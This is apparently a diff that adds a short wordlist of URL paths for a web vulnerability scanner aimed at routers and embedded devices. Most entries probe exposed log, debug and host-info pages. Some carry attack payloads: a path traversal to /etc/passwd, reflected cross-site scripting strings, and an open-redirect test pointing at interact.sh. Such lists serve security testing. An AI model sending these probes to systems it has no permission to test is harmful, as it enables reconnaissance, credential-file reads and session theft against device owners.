@@ -1,0 +1,10 @@
+/_syslog.txt
+/messages
+/loginLess/../../etc/passwd
+/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/boafrm/formWlanRedirect?redirect-url=http://interact.sh&wlan_id=1
+/debuginfo.htm
+/login/hostinfo.cgi
+/login/hostinfo2.cgi
+/<style%20onload=alert`document.domain`;>../..%2f
+/rootDesc.xml
